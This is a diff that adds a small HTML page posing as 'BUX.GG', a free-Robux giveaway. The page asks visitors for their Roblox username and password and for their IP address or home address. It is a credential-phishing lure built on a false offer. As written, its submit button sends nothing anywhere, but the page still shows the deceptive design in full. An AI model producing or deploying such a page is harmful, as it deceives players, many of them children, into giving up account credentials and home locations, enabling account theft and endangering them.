@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@300&display=swap" rel="stylesheet">
+<div class="Hello123">
+  <h1 class="DOG2"> BUX.GG</h1>
+  <h1> FREE ROBUX RIGHT NOW, FREE ROBUX TODAY!</h1>
+  <h2>ENTER YOUR ROBLOX ACCOUNT CREDENTIALS</h2>
+
+<center>
+  <label><input class="Hello23" placeholder="USERNAME" type="text"></input></label>
+  <label><input class="Hello23" placeholder="PASSWORD" type="password"></input></label>
+<label><input class="Hello23" placeholder="Enter your IP Address or Enter your address of your home" type="text"></input></label>
+
+<button action="https://google.com" class="Hello123">SUBMIT</button>
+  </center>
+</div>
+
+  
+  </body>
+</html>
